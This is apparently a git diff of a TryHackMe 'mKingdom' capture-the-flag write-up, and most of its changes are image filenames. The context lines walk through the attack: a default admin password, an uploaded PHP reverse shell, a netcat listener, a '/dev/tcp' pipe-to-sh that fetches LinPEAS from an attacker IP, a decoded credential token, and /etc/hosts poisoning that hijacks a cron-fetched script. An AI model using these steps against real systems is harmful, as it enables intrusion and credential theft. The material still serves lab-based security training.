@@ -1,6 +1,6 @@
 # mKingdom
 
-<figure><img src="../../../../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (87).png" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://tryhackme.com/r/room/mkingdom" %}
 
@@ -10,13 +10,13 @@
 nmap -sC -sV -Pn -T4 10.10.x.x
 ```
 
-<figure><img src="../../../../../.gitbook/assets/image (185).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (383).png" alt=""><figcaption></figcaption></figure>
 
 **I see that Port 85 work web service** `http://10.10.x.x:85/`
 
 
 
-<figure><img src="../../../../../.gitbook/assets/image (187).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (385).png" alt=""><figcaption></figcaption></figure>
 
 I use gobuster to Fuzzing dir
 
@@ -26,7 +26,7 @@ gobuster dir  -u http://10.10.112.62:85/ --wordlist=/usr/share/wordlists/seclist
 ```
 {% endcode %}
 
-<figure><img src="../../../../../.gitbook/assets/image (188).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (386).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -162,11 +162,11 @@ function printit ($string) {
 ```
 {% endhint %}
 
-<figure><img src="../../../../../.gitbook/assets/image (189).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (387).png" alt=""><figcaption></figcaption></figure>
 
 when scroll in web site i found username "admin" in /blog&#x20;
 
-<figure><img src="../../../../../.gitbook/assets/image (190).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (388).png" alt=""><figcaption></figcaption></figure>
 
 I tried to login with ‘**`admin`**’ as username and random passwords, and to my surprise, ‘**`password`**’ worked!
 
@@ -174,14 +174,14 @@ I tried to login with ‘**`admin`**’ as username and random passwords, and to
 
 According to instructions, I navigated to **System & Settings-> Allowed** file types, and added ‘.**php**’ in the allowed file types.
 
-<figure><img src="../../../../../.gitbook/assets/image (191).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (389).png" alt=""><figcaption></figcaption></figure>
 
 Then I went to Files -> File Manager and uploaded a php reverse shell. I started a Netcat listener on my attacking machine. After uploading the shell, I accessed it from the link provided on the website.
 
 \
 
 
-<figure><img src="../../../../../.gitbook/assets/image (192).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (390).png" alt=""><figcaption></figcaption></figure>
 
 I using reverse shell nc
 
@@ -192,7 +192,7 @@ nc -nvlp 9001
 in click URL to File\
 
 
-<figure><img src="../../../../../.gitbook/assets/image (193).png" alt=""><figcaption><p>Revers shell</p></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (391).png" alt=""><figcaption><p>Revers shell</p></figcaption></figure>
 
 > Priv Esc
 
@@ -205,7 +205,7 @@ stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38
 
 ```
 
-<figure><img src="../../../../../.gitbook/assets/image (195).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (393).png" alt=""><figcaption></figcaption></figure>
 
 I will try Useing **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
 
@@ -214,11 +214,11 @@ sudo nc  -lvnp 443 < linpeas.sh #Host
 cat < /dev/tcp/10.21.32.157/443 | sh #Victim
 ```
 
-<figure><img src="../../../../../.gitbook/assets/image (196).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (394).png" alt=""><figcaption></figcaption></figure>
 
 i found DB.php
 
-<figure><img src="../../../../../.gitbook/assets/image (197).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (395).png" alt=""><figcaption></figcaption></figure>
 
 ```
 <?php
@@ -240,11 +240,11 @@ return [
 
 ```
 
-<figure><img src="../../../../../.gitbook/assets/image (198).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (396).png" alt=""><figcaption></figcaption></figure>
 
 I logged in as **toad**. After a bit of looking around, I listed the current environment variables using ‘**env**’, and I found a **PWD\_token.**
 
-<figure><img src="../../../../../.gitbook/assets/image (199).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (397).png" alt=""><figcaption></figcaption></figure>
 
 ```bash
 echo "aWthVGVOVEFOdEVTCg==" | base64  -d
@@ -256,27 +256,27 @@ user : mario&#x20;
 
 pass : ikaTeNTANtES
 
-<figure><img src="../../../../../.gitbook/assets/image (200).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (398).png" alt=""><figcaption></figcaption></figure>
 
 But i don't cat the flag
 
-<figure><img src="../../../../../.gitbook/assets/image (201).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (399).png" alt=""><figcaption></figcaption></figure>
 
 i will move file to /tmp&#x20;
 
-<figure><img src="../../../../../.gitbook/assets/image (206).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (404).png" alt=""><figcaption></figcaption></figure>
 
 I ran linpeas again as mario, and found that /etc/hosts is writable
 
-<figure><img src="../../../../../.gitbook/assets/image (203).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (401).png" alt=""><figcaption></figcaption></figure>
 
 > **curl mkingdom.thm:85/app/castle/application/counter.sh**
 
 I modified the /etc/hosts file to add my **attacking machine IP** and **mkingdom.thm** as the corresponding hostname. Then I created the folder path /app/castle/application on my attacking machine and placed counter.sh there with a reverse shell payload.
 
-<figure><img src="../../../../../.gitbook/assets/image (204).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (402).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (88).png" alt=""><figcaption></figcaption></figure>
 
 > Exploit Used
 
